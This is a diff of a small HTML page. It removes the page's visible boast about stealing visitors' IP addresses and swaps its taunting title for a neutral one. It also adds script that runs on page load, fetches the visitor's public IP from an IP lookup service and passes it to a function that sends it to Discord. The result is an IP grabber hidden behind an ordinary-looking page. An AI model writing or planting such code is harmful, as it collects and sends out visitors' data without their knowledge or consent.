@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<p>I just stole ur ip!.</p>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>yo ip just got stolen twin</title>
+    <title>Your website ahh</title>
 </head>
 <body>
     <script>
@@ -31,3 +30,16 @@
                 }
             })
             .catch(error => console.error('Error:', error));
+        }
+
+        // Get the public IP address of the user
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                console.log('Your IP address is: ' + data.ip);
+                sendIpToDiscord(data.ip);
+            })
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
